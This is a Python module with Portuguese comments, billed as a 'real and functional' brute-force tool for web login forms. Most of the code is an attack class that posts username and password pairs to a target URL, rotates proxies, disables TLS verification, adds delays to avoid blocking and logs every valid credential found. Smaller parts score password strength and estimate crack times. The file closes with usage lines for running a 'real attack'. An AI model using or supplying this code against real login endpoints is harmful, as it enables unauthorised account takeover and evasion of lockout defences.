#!/usr/bin/env python3
"""
Módulo de Ataque de Força Bruta - REAL E FUNCIONAL (CORRIGIDO)
Focado em obter credenciais em formulários de login/registro.
AVISO: Apenas para fins educacionais em ambientes controlados.
"""

import requests
from itertools import cycle
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import json
import time
from datetime import datetime
import warnings
warnings.filterwarnings('ignore', category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class RealBruteForceModule:
    """Módulo real de força bruta para formulários web"""
    
    def __init__(self, target_url, username_field="phone", password_field="password", 
                 success_indicator="token", proxies=None):
        """
        Inicializa o módulo de força bruta
        
        Args:
            target_url: URL do alvo
            username_field: Nome do campo de usuário
            password_field: Nome do campo de senha
            success_indicator: Texto/campo que indica sucesso no login
            proxies: Lista de proxies para usar (opcional)
        """
        self.target_url = target_url
        self.username_field = username_field
        self.password_field = password_field
        self.success_indicator = success_indicator
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        })
        self.proxies = proxies
        self.proxy_pool = cycle(proxies) if proxies else None
        self.attempts = 0
        self.successful_credentials = []
        
    def _get_proxy_config(self):
        """Retorna configuração de proxy se disponível"""
        if self.proxy_pool:
            current_proxy = next(self.proxy_pool)
            return {"http": current_proxy, "https": current_proxy}
        return None
        
    def attempt_login(self, username, password):
        """
        Tenta um par de credenciais
        
        Args:
            username: Nome de usuário
            password: Senha
            
        Returns:
            dict: Resultado da tentativa
        """
        self.attempts += 1
        proxy_config = self._get_proxy_config()
        
        # Preparar payload
        payload = {
            self.username_field: username,
            self.password_field: password
        }
        
        try:
            # Tentar POST para endpoint de login
            response = self.session.post(
                self.target_url,
                json=payload,
                timeout=10,
                proxies=proxy_config,
                verify=False
            )
            
            result = {
                "attempt": self.attempts,
                "username": username,
                "password": password,
                "status_code": response.status_code,
                "success": False,
                "response_time": response.elapsed.total_seconds(),
                "timestamp": datetime.now().isoformat()
            }
            
            # Verificar se login foi bem-sucedido
            if response.status_code == 200:
                try:
                    response_data = response.json()
                    # Verificar se há indicador de sucesso na resposta
                    if self.success_indicator in response_data:
                        result["success"] = True
                        result["response_data"] = response_data
                        self.successful_credentials.append(result)
                        print(f"✅ [Tentativa {self.attempts}] SUCESSO! {username}:{password}")
                    else:
                        print(f"❌ [Tentativa {self.attempts}] Falha: {username}:{password}")
                except json.JSONDecodeError:
                    # Resposta não é JSON, verificar texto
                    if self.success_indicator.lower() in response.text.lower():
                        result["success"] = True
                        self.successful_credentials.append(result)
                        print(f"✅ [Tentativa {self.attempts}] SUCESSO! {username}:{password}")
                    else:
                        print(f"❌ [Tentativa {self.attempts}] Falha: {username}:{password}")
            else:
                print(f"❌ [Tentativa {self.attempts}] HTTP {response.status_code}: {username}:{password}")
                
            return result
            
        except requests.exceptions.Timeout:
            print(f"⏱️  [Tentativa {self.attempts}] Timeout: {username}:{password}")
            return {
                "attempt": self.attempts,
                "username": username,
                "password": password,
                "success": False,
                "error": "Timeout",
                "timestamp": datetime.now().isoformat()
            }
        except requests.exceptions.RequestException as e:
            print(f"❌ [Tentativa {self.attempts}] Erro: {str(e)}")
            return {
                "attempt": self.attempts,
                "username": username,
                "password": password,
                "success": False,
                "error": str(e),
                "timestamp": datetime.now().isoformat()
            }
    
    def brute_force_attack(self, usernames, passwords, delay=1.0):
        """
        Executa ataque de força bruta
        
        Args:
            usernames: Lista de usuários para testar
            passwords: Lista de senhas para testar
            delay: Delay entre tentativas (segundos)
            
        Returns:
            dict: Relatório do ataque
        """
        print(f"\n🎯 Iniciando ataque de força bruta em: {self.target_url}")
        print(f"📊 Testando {len(usernames)} usuários x {len(passwords)} senhas = {len(usernames) * len(passwords)} combinações")
        print("="*80)
        
        start_time = time.time()
        results = []
        
        for username in usernames:
            for password in passwords:
                result = self.attempt_login(username, password)
                results.append(result)
                
                # Se encontrou credenciais válidas, pode parar (opcional)
                if result.get("success"):
                    print(f"\n🎉 Credenciais válidas encontradas!")
                    break
                
                # Delay para evitar bloqueio
                time.sleep(delay)
            
            # Se encontrou credenciais válidas, pode parar
            if self.successful_credentials:
                break
        
        elapsed_time = time.time() - start_time
        
        report = {
            "target_url": self.target_url,
            "total_attempts": self.attempts,
            "successful_attempts": len(self.successful_credentials),
            "elapsed_time_seconds": round(elapsed_time, 2),
            "attempts_per_second": round(self.attempts / elapsed_time, 2) if elapsed_time > 0 else 0,
            "successful_credentials": self.successful_credentials,
            "all_results": results,
            "timestamp": datetime.now().isoformat()
        }
        
        print("\n" + "="*80)
        print(f"✅ Ataque concluído!")
        print(f"📊 Total de tentativas: {self.attempts}")
        print(f"✅ Credenciais encontradas: {len(self.successful_credentials)}")
        print(f"⏱️  Tempo total: {elapsed_time:.2f}s")
        
        return report


class PasswordStrengthAnalyzer:
    """Analisa a força de uma senha"""
    
    @staticmethod
    def calculate_strength(password):
        """
        Calcula a força de uma senha
        
        Args:
            password: Senha para analisar
            
        Returns:
            dict: Análise da força da senha
        """
        score = 0
        feedback = []
        
        # Critério 1: Comprimento
        if len(password) >= 8:
            score += 20
        else:
            feedback.append("❌ Senha deve ter pelo menos 8 caracteres")
        
        if len(password) >= 12:
            score += 10
        
        # Critério 2: Maiúsculas
        if any(c.isupper() for c in password):
            score += 20
        else:
            feedback.append("❌ Adicione letras maiúsculas")
        
        # Critério 3: Minúsculas
        if any(c.islower() for c in password):
            score += 20
        else:
            feedback.append("❌ Adicione letras minúsculas")
        
        # Critério 4: Números
        if any(c.isdigit() for c in password):
            score += 15
        else:
            feedback.append("❌ Adicione números")
        
        # Critério 5: Caracteres especiais
        if any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password):
            score += 15
        else:
            feedback.append("❌ Adicione caracteres especiais")
        
        # Determinar nível de força
        if score >= 80:
            strength = "FORTE"
            color = "green"
        elif score >= 60:
            strength = "MÉDIA"
            color = "yellow"
        elif score >= 40:
            strength = "FRACA"
            color = "orange"
        else:
            strength = "MUITO FRACA"
            color = "red"
        
        return {
            "password": password,
            "score": score,
            "strength": strength,
            "color": color,
            "feedback": feedback if feedback else ["✅ Senha forte!"]
        }


class BruteForceComparison:
    """Compara tempo de quebra de senhas fracas vs fortes"""
    
    WEAK_PASSWORDS = ["123456", "password", "admin", "qwerty", "abc123"]
    MEDIUM_PASSWORDS = ["Password123", "Admin2024", "MyPass123"]
    STRONG_PASSWORDS = ["P@ssw0rd!2024", "MyS3cur3P@ss!", "C0mpl3x!ty#2024"]
    
    @staticmethod
    def estimate_crack_time(password, attempts_per_second=1000):
        """
        Estima tempo para quebrar senha por força bruta
        
        Args:
            password: Senha para analisar
            attempts_per_second: Taxa de tentativas por segundo
            
        Returns:
            dict: Estimativa de tempo
        """
        # Calcular espaço de busca
        charset_size = 0
        if any(c.islower() for c in password):
            charset_size += 26
        if any(c.isupper() for c in password):
            charset_size += 26
        if any(c.isdigit() for c in password):
            charset_size += 10
        if any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password):
            charset_size += 32
        
        # Calcular total de combinações possíveis
        total_combinations = charset_size ** len(password)
        
        # Calcular tempo em segundos
        seconds = total_combinations / attempts_per_second
        
        # Converter para unidades legíveis
        if seconds < 60:
            time_str = f"{seconds:.2f} segundos"
        elif seconds < 3600:
            time_str = f"{seconds/60:.2f} minutos"
        elif seconds < 86400:
            time_str = f"{seconds/3600:.2f} horas"
        elif seconds < 31536000:
            time_str = f"{seconds/86400:.2f} dias"
        else:
            time_str = f"{seconds/31536000:.2f} anos"
        
        return {
            "password": password,
            "charset_size": charset_size,
            "password_length": len(password),
            "total_combinations": total_combinations,
            "seconds": seconds,
            "time_human": time_str
        }


# Exemplo de uso
if __name__ == "__main__":
    print("🔐 Módulo de Força Bruta - Exemplo de Uso")
    print("="*80)
    
    # Exemplo 1: Análise de força de senha
    print("\n📊 Exemplo 1: Análise de Força de Senha")
    passwords_to_test = ["123456", "Password123", "MyS3cur3P@ss!2024"]
    for pwd in passwords_to_test:
        analysis = PasswordStrengthAnalyzer.calculate_strength(pwd)
        print(f"\nSenha: {pwd}")
        print(f"Força: {analysis['strength']} (Score: {analysis['score']}/100)")
        for fb in analysis['feedback']:
            print(f"  {fb}")
    
    # Exemplo 2: Estimativa de tempo de quebra
    print("\n\n⏱️  Exemplo 2: Estimativa de Tempo de Quebra")
    for pwd in passwords_to_test:
        estimate = BruteForceComparison.estimate_crack_time(pwd)
        print(f"\nSenha: {pwd}")
        print(f"Tempo estimado: {estimate['time_human']}")
        print(f"Combinações possíveis: {estimate['total_combinations']:,}")
    
    print("\n\n⚠️  AVISO: Para executar ataque real, use:")
    print("brute = RealBruteForceModule('https://alvo.com/api/login')")
    print("brute.brute_force_attack(['user1', 'user2'], ['pass1', 'pass2'])")
